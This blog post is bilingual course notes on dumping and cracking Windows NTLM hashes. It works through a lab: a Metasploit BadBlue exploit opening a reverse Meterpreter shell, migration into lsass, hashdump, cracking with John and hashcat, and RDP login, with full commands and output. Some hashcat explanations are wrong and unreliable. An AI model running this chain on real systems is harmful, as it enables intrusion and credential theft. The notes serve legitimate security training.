---
layout: post
title: "Dumping & Cracking NTLM Hashes"
date: "2023-07-13"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Dumping & Cracking Windows Hashes
# Dumping & Cracking NTLM Hashes
## Windows Password Hashes
The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.

Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.

Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).

Windows versions up to Windows Server 2003 utilize two different types of hashes:
* LM
* NTLM

Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.

# 转储和破解Windows密码散列
# 转储和破解NTLM密码散列
## Windows密码散列
Windows操作系统在本地的SAM（安全账户管理器）数据库中存储了用户账户密码的散列值。

散列是将数据转换为另一个值的过程。散列函数或算法用于生成新的值。散列算法的结果称为散列或散列值。

用户凭据的认证和验证由本地安全机构（LSA）实现。

Windows版本直到Windows Server 2003使用两种不同类型的散列：
* LM
* NTLM

Windows从Windows Vista开始禁用了LM散列，并使用NTLM散列。

## SAM Database
SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.

The SAM database file cannot be copied while the operating system is running.

The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.

In modern versions of Windows, the SAM database is encrypted with a syskey.

Note: Elevated/Administrative privileges are required in order to access and interact with the LSASS process.

## SAM数据库
SAM（安全账户管理器）是一个负责在Windows上管理用户账户和密码的数据库文件。SAM数据库中存储的所有用户账户密码都经过散列处理。

在操作系统运行时，无法复制SAM数据库文件。

Windows NT内核会将SAM数据库文件锁定，因此攻击者通常使用内存技术和工具从LSASS进程转储SAM散列。

在现代版本的Windows中，SAM数据库使用syskey进行加密。

注意：需要提升/管理员权限才能访问和与LSASS进程进行交互。

## NTLM (NTHash)
NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.

From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.

When a user account is create, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.

NTLM improves upon LM in the following ways:
* Does not split the hash in to two chunks.
* Case sensitive.
* Allows the use of symbols and unicode characters.

![NTLM(NTHash).png](/img/in-post/ine/NTLM(NTHash).png)

## NTLM（NTHash）
NTLM是一组用于在Windows中实现计算机间认证的身份验证协议。认证过程涉及使用有效的用户名和密码进行成功认证。

从Windows Vista开始，Windows禁用了LM散列，并改为使用NTLM散列。

在创建用户账户时，使用MD4散列算法对其进行加密，同时原始密码被丢弃。

NTLM在以下方面改进了LM：
* 不将散列拆分为两个部分。
* 区分大小写。
* 允许使用符号和Unicode字符。

![NTLM(NTHash).png](/img/in-post/ine/NTLM(NTHash).png)

## Dumping & Cracking NTLM Hashes
We can dump Windows password hashes by leveraging various utilities like:
* The inbuilt meterpreter "hashdump" command
* Mimikatz

After we have dumped the hashes, we can crack them through the use of the following utilities:
* John The Ripper
* Hashcat

## 转储和破解NTLM散列
我们可以利用各种工具来转储Windows密码散列，例如：
* 内置的meterpreter "hashdump"命令
* Mimikatz

在我们转储了散列之后，可以通过以下工具来破解它们：
* John The Ripper
* Hashcat

# Demo: Dumping & Cracking NTLM Hashes（演示：转储和破解NTLM散列）
However, there are scenarios where a copy of the SAM database file has been made on the system for two primary reasons, one of which is just taking a backup and the administrator did not delete the backup file, therefore providing attacker with a copy of the SAM database that they can download or transfer. And secondly, when the Windows operating system encounter an issue and you try and repair the operating system, if you've ever used the Windows repair utility, then Windows will make a copy of the SAM database file and this copy usually needs to be deleted manually. So there are scenarios where you might find a copy of the SAM database file.

LSASS stands for the local security authority subsystem and this process on Windows is used for authentication and verification of credentials. And for that reason, it interacts with the SAM database. This process has a cache. A cache is typically where a program will store temporary data. Attackers and pentesters will typically utilize in-memory techniques to dump the SAM hashes from the LSASS process cache, because the LSASS process is being utilized for verification of credentials and authentication, it will go and check the SAM database and it stores that information in its cache and if we can gain access to that cache, then we can get the hashes that are stored in that cache and consequently crack them.

Target IP Address: 10.2.19.189

```
nmap -sV -p 80 10.2.19.189
```

This command runs the Nmap tool with the following options:
- `-sV`: Enables version detection for any services running on the target host
- `-p 80`: Specifies that Nmap should only scan port 80 on the target host
- `10.2.19.189`: The IP address of the target host to be scanned.

In summary, this command will scan port 80 on the target host and attempt to determine the version of any services running on that port.

```
searchsploit BadBlue
```

```
msfconsole
search BadBlue
use exploit/windows/http/badblue_passthru
```

The default payload is the 32-bit meterpreter payload.

```
show options
set RHOSTS 10.2.19.189
exploit
```

Let's perform some basic local enumeration.

```
meterpreter > sysinfo
```

It is a 64-bit operating system and we have a 32-bit meterpreter session.

```
meterpreter > getuid
```

We currently have access to the target system as the administrator user.

```
meterpreter > getprivs
```

We have the permissions that you typically associate with the administrator user. So that means that we do not need to elevate our privileges and can consequently move on to the next phase, which is dumping the NTLM hashes.

However, before we do this, given the fact that we're going to be targeting the LSASS process cache, it would be a good idea to identify the LSASS process id, and then migrating into it.

```
meterpreter > pgrep lsass
708
```

This will solve two issues. Firstly, it will upgrade our meterpreter session to a 64-bit meterpreter session. And secondly, it'll make our meterpreter session much more stable in the context of accessing the LSASS process cache.

```
meterpreter > migrate 708
```

I can now utilize the hashdump utility.

```
meterpreter > hashdump
```

This will dump a list of user accounts and their hashes. NTLM hashes.

And in most cases, the Guest account is disabled by default.

Confirm what other user accounts on the system.

```
meterpreter > shell
net user
```

Copy these hashes. Open up a new tab here.

```
cd Desktop/
vim hashes.txt
cat hashes.txt
```

In order to crack NTLM hashes, we can utilize the John utility.

```
john
```

In this case, we're primarily focusing on how to crack an NTLM hash.

What we need to provide firstly is the format of the hashes that we want to crack. And that can be specified through the use of the `--format=NAME` option.

```
--format=NAME force hash of type NAME. The supported formats can be seen with --list=formats and --list=subformats

--format=NAME 强制使用名称为 NAME 的哈希类型。可以使用 --list=formats 和 --list=subformats 命令查看支持的格式。
```

List the available formats.

```
john --list=formats
```

These are all the formats that you can crack with John the Ripper.

这个命令是用于列出 John the Ripper 支持的哈希格式。当你在使用 John the Ripper 进行密码破解时，需要指定哈希格式，以便 John 能够正确地处理哈希值。通过运行 `john --list=formats` 命令，你可以查看 John 支持的所有哈希格式的列表。

This command is used to list the hash formats supported by John the Ripper. When you use John the Ripper to crack passwords, you need to specify the hash format so that John can handle the hash value correctly. By running the command `john --list=formats`, you can view a list of all the hash formats that John supports.

```
john --list=formats | grep NT

NT
```

Let's try and use the default John the Ripper wordlist.

```
john --format=NT hashes.txt
```

这个命令使用了John the Ripper工具来破解Windows NT哈希值。具体来说，它指定了哈希文件的名称为"hashes.txt"，并使用"--format=NT"参数来告诉John the Ripper工具这些哈希值是Windows NT格式的。

This command uses the John the Ripper tool to crack Windows NT hash values. Specifically, it specifies the name of the hash file as "hashes.txt" and uses the "--format=NT" parameter to tell the John the Ripper tool that these hash values are in the Windows NT format.

```
password1   (bob)
password    (Administrator)
```

It means that we can now legitimately authenticate with the target system either through RDP or through another protocol like SSH, if SSH has been installed on the target system. However, in the event that we were not able to crack the hashes, we could have still utilized the hashes to authenticate with the target system via SMB utilizing the psexec utility.

```
--wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin
```

这个命令的意思是，使用单词列表模式，从文件或标准输入中读取单词。"`--wordlist[=FILE]`"参数指定了单词列表文件的名称，如果不指定，则默认从标准输入中读取单词。

By default, it is compressed with the gzip compression algorithm. So we can decompress it by saying:

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

这个命令使用gzip工具来解压缩文件。具体来说，它指定了要解压缩的文件的路径为"/usr/share/wordlists/rockyou.txt.gz"，并使用"-d"参数来告诉gzip工具进行解压缩操作。解压缩后的文件路径为"/usr/share/wordlists/rockyou.txt"。

This command uses the gzip tool to decompress a file. Specifically, it specifies the path of the file to be decompressed as "/usr/share/wordlists/rockyou.txt.gz" and uses the "-d" parameter to tell the gzip tool to perform a decompression operation. The decompressed file will be located at "/usr/share/wordlists/rockyou.txt".

```
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

这个命令使用了John the Ripper工具来破解Windows NT哈希值。具体来说，它指定了哈希文件的名称为"hashes.txt"，并使用"--format=NT"参数来告诉John the Ripper工具这些哈希值是Windows NT格式的。另外，它使用"--wordlist=/usr/share/wordlists/rockyou.txt"参数来指定单词列表文件的路径，以便John the Ripper工具可以使用这个单词列表来尝试破解密码。

This command uses the John the Ripper tool to crack Windows NT hash values. Specifically, it specifies the name of the hash file as "hashes.txt" and uses the "--format=NT" parameter to tell the John the Ripper tool that these hash values are in the Windows NT format. Additionally, it uses the "--wordlist=/usr/share/wordlists/rockyou.txt" parameter to specify the path of a wordlist file, so that John the Ripper tool can use this wordlist to try to crack passwords.

We can now move on to cracking these hashes with hashcat.

```
hashcat --help
```

```
- [ Options ] -

-m, --hash-type     Num Hash-type, see references below -m 1000
-a, --attack-mode   Num Attack-mode, see refernces below    -a 3
```

这个命令中，"-m, --hash-type"参数指定哈希类型的编号，可以参考下面的引用链接来查看不同类型的哈希值。"-m 1000"表示使用哈希类型编号为1000的哈希值。

另外，"-a, --attack-mode"参数指定攻击模式的编号，可以参考下面的引用链接来查看不同的攻击模式。"-a 3"表示使用攻击模式编号为3的攻击模式。

```
- [ Hash modes ] -

1000 NTLM   Operating System
```

"-m 1000"对应的是NTLM哈希类型，该哈希类型通常用于Windows操作系统中的用户凭据验证。

```
- [ Attack Modes ] -

3   Brute-force
```

```
- [ Basic Examples ] -

Brute-Force MD5 hashcat -a 3 -m 0 example.hash ?a?a?a?a?a?a
```

这里是Hashcat工具的用户手册，"- [ Basic Examples ] -"是一个章节标题，下面列出了一些基本的使用示例。

这个命令使用Hashcat工具来暴力破解MD5哈希值。具体来说，它使用"-a 3"参数来指定暴力破解攻击模式，使用"-m 0"参数来指定哈希类型为MD5。最后，它使用"?a?a?a?a?a?a"模式来指定密码的格式，其中每个"?a"表示一个小写字母。这意味着Hashcat工具将使用所有可能的6个小写字母组合来尝试破解密码。"example.hash"是包含MD5哈希值的文件的名称。

This is a section in the documentation of Hashcat tool, titled "- [ Basic Examples ] -", which provides some basic usage examples.

This command uses the Hashcat tool to perform a brute-force attack on an MD5 hash value. Specifically, it uses the "-a 3" parameter to specify the brute-force attack mode, and the "-m 0" parameter to specify the hash type as MD5. Finally, it uses the "?a?a?a?a?a?a" pattern to specify the format of the password, where each "?a" represents a lowercase letter. This means that Hashcat tool will use all possible combinations of 6 lowercase letters to try to crack the password. "example.hash" is the name of the file that contains the MD5 hash value.

```
hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

这个命令使用Hashcat工具来破解NTLM哈希值。具体来说，它使用"-a3"参数来指定暴力破解攻击模式，使用"-m 1000"参数来指定哈希类型为NTLM。"hashes.txt"是包含NTLM哈希值的文件的名称。最后，它使用"/usr/share/wordlists/rockyou.txt"参数来指定单词列表文件的路径，以便Hashcat工具可以使用这个单词列表来尝试破解密码。

This command uses the Hashcat tool to crack NTLM hash values. Specifically, it uses the "-a3" parameter to specify the brute-force attack mode, and the "-m 1000" parameter to specify the hash type as NTLM. "hashes.txt" is the name of the file that contains the NTLM hash values. Finally, it uses "/usr/share/wordlists/rockyou.txt" parameter to specify the path of a wordlist file, so that Hashcat tool can use this wordlist to try to crack passwords.

We can now utilize these passwords or the hashes themselves to authenticate with the target system legitimately. And I've covered how to do this either through the psexec utility, or the psexec Python script or through the psexec Metasploit Framework module. If RDP is enabled on the target system, you can log in that way.

```
nmap -p 3389 10.2.19.189
```

The port 3389 is currently open, which means that RDP is enabled. So we can authenticate with the target system using the passwords we were able to identify from the hash cracking process.

```
xfreerdp /u:Administrator /p:password /v:10.2.19.189
```

The great thing with this is I've done this legitimately without utilizing an exploit. And after you've gained the clear text passwords for user accounts on a Windows system, because you now have unrestricted access to that target system. And you can authenticate to it whenever you want. So this is another good form of persistence or another form of maintaining access on the Windows system that you have compromised.

That is how to dump and crack NTLM hashes on a Windows system that you've compromised through the use of John the Ripper and the hashcat utility.

# Windows: NTLM Hash Cracking（Windows：NTLM 哈希破解）
## Overview（概述）
A Kali GUI machine and a target machine running vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

我们为您提供了一台 Kali GUI 机器和一台运行易受攻击的应用程序的目标机器。目标计算机的 IP 地址在 Kali 计算机桌面 (/root/Desktop/target) 上名为 target 的文本文件中提供。

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the machine using the appropriate Metasploit module. Then, dump the NTLM hashes and crack them using an auxiliary module.

您的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，并使用适当的 Metasploit 模块利用该机器。然后，转储 NTLM 哈希并使用辅助模块破解它们。

Objective: Exploit the application and get all the flags.

目标：利用该应用程序并获取所有标志。

Instructions:
* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. 
* The IP address of the target machine is mentioned in the file “/root/Desktop/target” 
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

说明：
* 您的 Kali 机器有一个 IP 地址为 10.10.X.Y 的接口。运行“ip addr”即可知道X和Y的值。 
* 目标机器的IP地址在文件“/root/Desktop/target”中提到 
* 不要攻击位于IP地址192.V.W.1和的网关10.10.X.1

## Solutions（解决方案）
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-2351.pdf

本实验的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2351.pdf

## 复现视频内容
Target IP Address : 10.0.18.253

Kali Linux : 10.10.16.2

```
root@attackdefense:~# nmap -sV -p 80 10.0.18.253
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-13 06:46 IST
Nmap scan report for 10.0.18.253
Host is up (0.0030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
```

```
root@attackdefense:~# searchsploit BadBlue 2.7
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
BadBlue 2.72 - PassThru Remote Buffer Overflow                                                                                                              | windows/remote/4784.pl
BadBlue 2.72b - Multiple Vulnerabilities                                                                                                                    | windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)                                                                                                       | windows/remote/16806.rb
Working Resources BadBlue 1.2.7 - Denial of Service                                                                                                         | windows/dos/20641.txt
Working Resources BadBlue 1.2.7 - Full Path Disclosure                                                                                                      | windows/remote/20640.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```
root@attackdefense:~# msfconsole -q
msf6 > search BadBlue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > set RHOSTS 10.0.18.253
RHOSTS => 10.0.18.253
msf6 exploit(windows/http/badblue_passthru) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.0.18.253
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.18.253:49262) at 2023-07-13 06:51:11 +0530

meterpreter > 
```

```
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

```
meterpreter > pgrep lsass
708
meterpreter > migrate 708
[*] Migrating from 2984 to 708...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```
meterpreter > shell
Process 1036 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            bob                      Guest                    
The command completed with one or more errors.
```

```
root@attackdefense:~# cd Desktop/
root@attackdefense:~/Desktop# vim hashes.txt
root@attackdefense:~/Desktop# cat hashes.txt 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
```

```
root@attackdefense:~/Desktop# john --list=formats
```

```
root@attackdefense:~/Desktop# john --list=formats | grep NT
netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, nsec3, NT, o10glogon,
```

```
root@attackdefense:~/Desktop# john --format=NT hashes.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=48
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 8 candidates buffered for the current salt, minimum 24 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 24 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 24 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
password1        (bob)
password         (Administrator)
2g 0:00:00:00 DONE 2/3 (2023-07-13 07:04) 200.0g/s 193000p/s 193000c/s 386000C/s 123456..knight
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

```
password1        (bob)
password         (Administrator)
```

```
root@attackdefense:~/Desktop# gzip -d /usr/share/wordlists/rockyou.txt.gz 
root@attackdefense:~/Desktop# john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
No password hashes left to crack (see FAQ)
```

```
root@attackdefense:~/Desktop# hashcat --help
```

```
root@attackdefense:~/Desktop# hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

5835048ce94ad0564e29a924a03510ef:password1       
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: hashes.txt
Time.Started.....: Thu Jul 13 07:19:38 2023 (0 secs)
Time.Estimated...: Thu Jul 13 07:19:38 2023 (0 secs)
Guess.Mask.......: password1 [9]
Guess.Queue......: 28/14336793 (0.00%)
Speed.#1.........:     1385 H/s (0.05ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: password1 -> password1

Started: Thu Jul 13 07:18:50 2023
Stopped: Thu Jul 13 07:19:39 2023
```

```
root@attackdefense:~/Desktop# nmap -p 3389 10.0.18.253
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-13 07:24 IST
Nmap scan report for 10.0.18.253
Host is up (0.0027s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

```
root@attackdefense:~/Desktop# xfreerdp /u:Administrator /p:password /v:10.0.18.253
```